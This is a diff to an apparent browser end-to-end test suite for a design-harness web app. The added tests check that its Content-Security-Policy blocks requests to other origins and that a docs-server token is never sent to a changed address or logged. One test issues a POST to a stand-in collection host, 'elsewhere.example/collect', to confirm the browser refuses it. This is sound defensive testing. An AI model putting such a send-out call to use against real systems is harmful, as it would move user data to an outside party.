@@ -23,6 +23,7 @@ import { strFromU8, unzipSync } from "fflate";
 import { build as viteBuild, preview } from "vite";
 import { build as esbuild } from "esbuild";
 import { errorBody, fakeAnthropic, streamEvents } from "./fake-anthropic.mjs";
+import { APP_CSP, APP_HEADERS } from "../../../scripts/app-headers.mjs";
 
 const here = dirname(fileURLToPath(import.meta.url));
 const root = join(here, "..");
@@ -1219,6 +1220,79 @@ test("an old project and an old project file load with no docs, and an imported 
   await page.locator('[data-testid="import-file"]').setInputFiles(join(dir, "leaky.design-harness.json"));
   await page.getByText('$.docs[0]: has unknown fields "authorization_token"').waitFor();
   assert.equal(await page.getByTestId("project-docs").getByTestId("doc-source").count(), 1, "nothing of the refused file was imported");
+  assert.deepEqual(errors, []);
+});
+
+test("the app is served with its Content-Security-Policy: it reaches only its own origin and api.anthropic.com", async ({ browser, base }) => {
+  const context = await browser.newContext();
+  const page = await context.newPage();
+  const response = await page.goto(base);
+  assert.equal(response.headers()["content-security-policy"], APP_CSP);
+  // The policy itself refuses the request, before any network: the violation names connect-src.
+  const violated = await page.evaluate(async () => {
+    const seen = new Promise((resolve) => document.addEventListener("securitypolicyviolation", (event) => resolve(event.effectiveDirective), { once: true }));
+    await fetch("https://elsewhere.example/collect", { method: "POST", body: "x" }).catch(() => undefined);
+    return seen;
+  });
+  assert.equal(violated, "connect-src", "the page cannot send anything to another origin");
+});
+
+test("a docs server's token goes only to the address it was given for: an imported project that moves the server, or an edit of its address, sends none", async ({ browser, base, api }) => {
+  const { page, errors, logs } = await openApp(browser, base);
+  await measured(page, 1);
+  await mainView(page, "Project").click();
+  const docs = page.getByTestId("project-docs");
+  await addDocServer(page, { url: "https://mcp.example.com/mcp", label: "Design docs", token: DOC_TOKEN, remember: true });
+  // A shared file that reuses this project's id and the server's name, at another address.
+  const [download] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: "Export", exact: true }).click()]);
+  const file = JSON.parse(readFileSync(await download.path(), "utf8"));
+  const moved = { ...file, docs: [{ kind: "mcp", url: "https://elsewhere.example/mcp", name: "design-docs", label: "Design docs" }] };
+  const dir = mkdtempSync(join(tmpdir(), "docs-moved-"));
+  writeFileSync(join(dir, "nook.design-harness.json"), JSON.stringify(moved));
+  await page.locator('[data-testid="import-file"]').setInputFiles(join(dir, "nook.design-harness.json"));
+  await eventually(
+    page,
+    async () => {
+      await mainView(page, "Project").click();
+      return docs.getByTestId("doc-source").getByTestId("doc-source-reach").textContent();
+    },
+    (text) => text === 'The agent can call this server\'s tools, as "design-docs". No token.',
+    "the moved server shows no token",
+  );
+  api.script([
+    (body) => {
+      assert.deepEqual(body.mcp_servers, [{ type: "url", url: "https://elsewhere.example/mcp", name: "design-docs" }], "the token kept for the old address is not sent to the new one");
+      return textReply("Noted.");
+    },
+    (body) => {
+      assert.deepEqual(body.mcp_servers, [{ type: "url", url: "https://mcp.example.com/mcp", name: "design-docs" }], "an edited address carries no token either");
+      return textReply("Noted again.");
+    },
+  ]);
+  await mainView(page, "Canvas").click();
+  await enterKey(page);
+  await ask(page, "Hello");
+  assert.equal(await turnEnded(page), "done");
+
+  // A token given for the new address is sent there; moving the server again by an edit forgets it.
+  await mainView(page, "Project").click();
+  await docs.getByRole("button", { name: "Edit Design docs" }).click();
+  let edit = docs.getByRole("form", { name: "Edit Design docs" });
+  await edit.getByLabel("Token (optional)").fill(DOC_TOKEN);
+  await edit.getByRole("button", { name: "Save" }).click();
+  await edit.waitFor({ state: "detached" });
+  assert.match(await docs.getByTestId("doc-source-reach").textContent(), /Token mcp-e2e…ghij/);
+  await docs.getByRole("button", { name: "Edit Design docs" }).click();
+  edit = docs.getByRole("form", { name: "Edit Design docs" });
+  await edit.getByLabel("Server address").fill("https://mcp.example.com/mcp");
+  await edit.getByRole("button", { name: "Save" }).click();
+  await edit.waitFor({ state: "detached" });
+  assert.match(await docs.getByTestId("doc-source-reach").textContent(), /No token\.$/);
+  await mainView(page, "Canvas").click();
+  await ask(page, "Hello again");
+  assert.equal(await turnEnded(page), "done");
+  assert.equal(api.left(), 0);
+  assert.ok(logs.every((line) => !line.includes(DOC_TOKEN)), "the token is never logged");
   assert.deepEqual(errors, []);
 });
 
@@ -7034,7 +7108,8 @@ test("the New project wizard at phone width: every step fits the screen with its
 
 // ---- runner ----------------------------------------------------------------
 
-const server = await preview({ root, configFile: join(root, "vite.config.ts"), logLevel: "silent", preview: { port: 0, host: "127.0.0.1" } });
+// The app is served with its production headers, its Content-Security-Policy included.
+const server = await preview({ root, configFile: join(root, "vite.config.ts"), logLevel: "silent", preview: { port: 0, host: "127.0.0.1", headers: APP_HEADERS } });
 const address = server.httpServer.address();
 const base = `http://127.0.0.1:${address.port}/`;
 // The fake Anthropic API answers at api.anthropic.com: Chromium resolves that host to it, with no proxy, so the
